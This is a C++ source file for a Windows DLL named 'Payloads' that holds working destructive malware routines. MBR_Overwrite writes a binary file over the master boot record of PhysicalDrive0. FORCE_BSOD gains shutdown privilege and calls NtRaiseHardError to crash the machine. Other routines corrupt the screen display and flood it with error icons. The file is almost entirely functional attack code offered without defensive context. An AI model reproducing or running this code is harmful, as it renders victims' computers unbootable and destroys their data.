// Payloads.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "Payloads.h"

namespace Payloads
{
	void GetDesktopResolution(int& horizontal, int& vertical) { RECT desktop; const HWND hDesktop = GetDesktopWindow(); GetWindowRect(hDesktop, &desktop); horizontal = desktop.right; vertical = desktop.bottom; }

	void Payloads::MBR_Overwrite()
	{
		DWORD dw;
		LPCWSTR pathToBin = L"C:\\Windows\\data.bin";
		HANDLE drive = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		if (drive != INVALID_HANDLE_VALUE) {
			HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
			if (binary != INVALID_HANDLE_VALUE) {
				DWORD size = GetFileSize(binary, 0);
				if (size > 0) {
					BYTE *mbr = new BYTE[size];
					if (ReadFile(binary, mbr, size, &dw, 0)) {
						NULL;
						if (WriteFile(drive, mbr, size, &dw, 0)) {
							NULL;
						}
					}
				}
			}
			CloseHandle(binary);
		}
		CloseHandle(drive);
		_getch();
	}

	void Payloads::FORCE_BSOD()
	{
		HMODULE ntdll = LoadLibraryA("ntdll");
		FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

		if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {

			BOOLEAN tmp1; DWORD tmp2;
			((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
			((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
		}

		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN);
	}

	void Payloads::Screen_Glitching()
	{
		int Timer = 7500; int horizontal = 0; int vertical = 0; GetDesktopResolution(horizontal, vertical);

		while (true)
		{
			Sleep(Timer);
			srand(time(0));

			StretchBlt(GetDC(NULL), rand() % 15 + (15), rand() % 15 + (15), horizontal - rand() % 15 + (15), vertical - rand() % 15 + (15), GetDC(NULL), 0, 0, horizontal + rand() % 15 + (15), vertical + rand() % 15 + (15), SRCAND);
			StretchBlt(GetDC(NULL), rand() % 15 + (15), rand() % 15 + (15), horizontal - rand() % 15 + (15), vertical - rand() % 15 + (15), GetDC(NULL), 0, 0, horizontal + rand() % 15 + (15), vertical + rand() % 15 + (15), SRCPAINT);

			if (Timer > 750) { Timer -= 750; }
		}
	}

	void Payloads::Screen_Screw()
	{
		int horizontal = 0; int vertical = 0; GetDesktopResolution(horizontal, vertical);

		HDC hDC = GetDC(NULL);

		int cy = 0;
		int cx = 0;

		while (cx != horizontal)
		{
			StretchBlt(hDC, cx, cy, 10, vertical, hDC, cx, cy, 10, vertical, DSTINVERT);
			cx = cx + 1;
		}
	}

	void Display_Icons_Error()
	{
		int horizontal = 0; int vertical = 0; GetDesktopResolution(horizontal, vertical);
		int ix = GetSystemMetrics(SM_CXICON); int iy = GetSystemMetrics(SM_CYICON);
		int b = 0;

		for (int a = 0; vertical > b;)
		{
			Sleep(0005);
			DrawIcon(GetDC(NULL), a, b, LoadIcon(NULL, IDI_ERROR));
			a = a + iy;
			if (a == horizontal)
			{
				b = b + ix;
				a = 0;
			}
		}
	}

	void Payloads::Cursor_Icons(HINSTANCE hInstance)
	{
		while (true)
		{
			Sleep(0015);

			POINT cursor;
			GetCursorPos(&cursor);

			int ix = 32 / 2;
			int iy = 32 / 2;

			HDC hDC = GetDC(NULL);
			
			DrawIcon(hDC, cursor.x - ix, cursor.y - iy, (HICON)LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1)));

			//DrawIcon(GetDC(NULL), cursor.x - ix, cursor.y - iy, /*LoadImage(NULL, MAKEINTRESOURCE(IDI_ICON1), IMAGE_ICON, 32, 32, LR_LOADTRANSPARENT | LR_LOADFROMFILE | LR_SHARED)*/LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON1)));
		}
	}
}
